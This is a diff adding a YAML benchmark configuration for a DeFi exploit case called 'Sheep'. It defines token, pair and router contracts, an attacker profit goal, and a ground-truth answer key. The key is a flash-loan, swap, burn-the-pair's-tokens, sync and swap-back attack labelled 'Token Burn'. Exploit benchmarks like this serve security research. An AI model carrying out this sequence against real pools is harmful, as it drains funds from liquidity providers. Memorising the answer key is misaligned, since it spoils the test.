@@ -1,0 +1,55 @@
+# Information for benchmarks building.
+project_name: "Sheep"
+
+ctrt_name2cls:
+  - ["sheep", "Sheep"]
+  - ["wbnb", "WBNB"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["sheep", "new Sheep('Sheep', 'Sheep', 9, 72363505585, 0, 0, 0, address(0x0), owner)"]
+  - ["wbnb", ""]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+  - "function burn_pair_sheep(uint256 amount) internal {
+    sheep.burn(address(pair), amount);
+    }"
+
+extra_deployments: []
+extra_constraints: []
+
+attack_goal: "wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker"
+
+groundtruth:
+  - ["borrow", "wbnb", "38000e15"]
+  - ["swap", "pair", "wbnb", "sheep", "wbnb.balanceOf(attacker)"]
+  - ["burn", "pair", "sheep", "sheep.balanceOf(address(pair)) - 1"]
+  - ["sync", "pair"]
+  - ["swap", "pair", "sheep", "wbnb", "sheep.balanceOf(attacker)"]
+  - ["payback", "wbnb", "38114e15"]
+
+# Information for search space building.
+roles:
+  "wbnb":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "sheep":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+    is_burnable: true
+  "pair":
+    is_swappair: true
+    uniswap_order: ["sheep", "wbnb"]
+    support_swaps:
+      "wbnb": ["sheep", "wbnb"]
+      "sheep": ["sheep", "wbnb"]
+    is_oracle: true
+
+pattern: "Token Burn"
